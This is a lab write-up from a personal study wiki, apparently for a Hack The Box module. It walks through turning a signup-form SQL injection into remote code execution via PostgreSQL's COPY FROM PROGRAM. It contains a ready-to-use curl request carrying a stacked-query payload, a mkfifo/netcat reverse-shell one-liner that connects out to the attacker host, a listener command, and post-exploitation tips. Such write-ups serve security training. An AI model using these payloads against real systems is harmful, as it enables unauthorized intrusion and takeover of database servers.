---
tags: [lab, attack/web]
module: advanced_sql_injections
last_updated: 2026-05-22
---

# Lab: Command Execution

Target: BlueBird application on port 8080. Requires the signup SQLi identified in [[labs/htb/advanced_sql_injections/reading_and_writing_files]] and a netcat listener on the attacker machine.

This lab achieves RCE via PostgreSQL's `COPY FROM PROGRAM` command, chained through the unsafe INSERT in `POST /signup`. All steps are CLI-based.

## Tool Installation

```bash
# netcat (pre-installed on Kali)
nc --version || sudo apt install ncat -y

# curl
curl --version || sudo apt install curl -y
```

---

## Question 1 — Read `/var/lib/postgresql/13/main/flag.txt` via RCE

**Goal:** Use `COPY FROM PROGRAM` in the signup SQLi to establish a reverse shell, then read the flag file.

### Step 1 — Assess the escalation path from file write to command execution

**Why try RCE after file write:** In the previous lab you wrote a file to the PostgreSQL data directory. File write is useful, but it's limited — you can write content but can't interact with the OS, read files outside PostgreSQL's accessible paths easily, or establish persistence. RCE via a reverse shell gives you an interactive OS session as the `postgres` user.

**What `COPY FROM PROGRAM` does:** This PostgreSQL feature runs an OS command and treats its standard output as data to import into a table. It was added in PostgreSQL 9.3 and is considered a legitimate DBA feature for importing data from scripts. From a security perspective, it's OS command execution with the privileges of the `postgres` OS user.

**Prerequisite check:** `COPY FROM PROGRAM` requires the database user to have `pg_execute_server_program` or be a superuser. You know from the previous lab that the DB user has COPY write capabilities — that's a strong indicator (but not a guarantee) that `pg_execute_server_program` is also available.

**Decision point — COPY FROM PROGRAM vs C extension:** There are two PostgreSQL RCE methods. COPY FROM PROGRAM is simpler: it requires no external files and no compilation. The C extension method (see [[labs/htb/advanced_sql_injections/skills_assessment]]) requires compiling a shared library and uploading it via Large Objects, but works even when `pg_execute_server_program` is not granted. Use COPY FROM PROGRAM first; fall back to C extensions if it fails.

### Step 2 — Choose the right reverse shell payload

**Why a named pipe shell instead of `nc -e`:** The target is likely running OpenBSD netcat, which does not have the `-e` flag (execute). The classic `nc -e /bin/sh LHOST LPORT` won't work. The named pipe (mkfifo) approach creates a bidirectional channel without needing `-e`:

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT > /tmp/f
```

How it works:
1. `mkfifo /tmp/f` — creates a named pipe (FIFO file)
2. `cat /tmp/f` — reads from the pipe (blocks until data arrives)
3. Pipe output to `/bin/sh -i 2>&1` — runs an interactive shell with both stdout and stderr redirected
4. `| nc LHOST LPORT > /tmp/f` — sends shell output over the network AND writes incoming data back to the pipe
5. The loop closes: incoming data → pipe → shell → network → attacker

**What IP and port to use:** Your attacker machine's IP on the HTB VPN (check `ip a` or `ifconfig tun0`). Choose any port that isn't already in use — 4444 and 9001 are common defaults, 7331 is used in the official writeup.

### Step 3 — Start a listener BEFORE sending the payload

**Why before, not after:** The COPY FROM PROGRAM executes immediately when the SQL runs. If the target connects back and finds no listener, the connection attempt fails, the shell exits, and the COPY statement either hangs or errors. You don't get a retry — you'd need to send the entire signup request again.

```bash
nc -nvlp <LPORT>
```

Leave this terminal open and proceed to the next step in a separate window.

### Step 4 — Send the RCE payload via the signup endpoint

This is the same stacked-query structure as the file-write lab, but instead of `COPY TO`, you use `COPY FROM PROGRAM`:

```bash
curl -s -X POST "http://<TARGET_IP>:8080/signup" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name=Life', 'Short', 'Art@art.art', 'Long'); CREATE TABLE dbBackups(backup TEXT); COPY dbBackups FROM PROGRAM 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f';SELECT * FROM dbBackups; DROP TABLE dbBackups; --" \
  --data-urlencode "username=anyuser456" \
  --data-urlencode "email=any2@test.com" \
  --data-urlencode "password=anypassword"
```

**Why the curl request hangs:** The curl request won't return until the SQL completes. `COPY FROM PROGRAM` runs the shell command synchronously, and the shell command blocks (it's keeping a reverse shell open). The curl hang is expected — it means the shell is alive. Don't kill it.

**Why SELECT * FROM dbBackups is included:** The `COPY FROM PROGRAM` populates the table with the command's stdout. The `SELECT *` forces evaluation in some execution contexts. The `DROP TABLE` cleanup runs after the shell session ends.

### Step 5 — Interact with the reverse shell

In the netcat listener terminal, you should see:

```
Ncat: Connection from <TARGET_IP>.
/bin/sh: 0: can't access tty; job control turned off
$
```

The `can't access tty` message is normal — this is a non-interactive shell. Basic commands work fine.

**If no connection arrives:** Check your VPN IP, verify the port number matches, and check that no firewall is blocking the port. Try a different port number. Also verify the previous lab (COPY TO) worked — if it did, the DB user has the required privileges for COPY FROM PROGRAM too.

### Step 6 — Read the flag file

```bash
cat /var/lib/postgresql/13/main/flag.txt
```

The flag value is printed to the shell.

**What else you can do from this shell:** You are the `postgres` OS user. From here, common next steps in a real engagement include:
- Reading PostgreSQL data files directly (`/var/lib/postgresql/13/main/`)
- Pivoting to other services accessible from the server
- Checking for SUID binaries or sudo permissions for the postgres user: `sudo -l`
- Looking for other applications or config files in `/opt/`, `/etc/`

---

## Lessons Learned

- `COPY FROM PROGRAM` and `COPY TO file` require the same class of privilege — if one works, the other likely does too
- Always set up the listener first when doing reverse shell exploits; there's usually no second chance without resending the payload
- The mkfifo shell is the standard OpenBSD netcat reverse shell; it's worth memorizing since OpenBSD netcat is default on most Debian/Ubuntu targets
- Verify your VPN IP before building the payload — using the wrong LHOST is the most common reason a reverse shell never connects

## Related Pages

- [[attack/web/postgresql_rce]] — COPY FROM PROGRAM and C extension RCE reference
- [[attack/web/postgresql_file_read_write]] — COPY TO file write (prerequisite concept)
- [[labs/htb/advanced_sql_injections/reading_and_writing_files]] — same injection point, file write variant
- [[labs/htb/advanced_sql_injections/skills_assessment]] — C extension method when COPY FROM PROGRAM is unavailable
